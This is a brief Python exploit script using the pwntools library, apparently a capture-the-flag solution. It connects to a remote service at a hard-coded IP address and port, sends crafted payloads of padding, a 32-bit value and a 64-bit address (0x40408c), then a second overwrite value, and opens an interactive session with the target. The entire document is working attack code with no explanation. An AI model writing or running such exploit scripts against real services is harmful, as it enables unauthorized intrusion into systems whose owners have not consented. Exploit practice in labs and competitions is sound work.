from pwn import *

proc = remote("109.233.56.90", 11603)
input()
proc.send(b"a"*8+p32(0x0)+p64(0x40408c))
proc.send(b"a"*8+p32(0xffffffff))
proc.interactive()
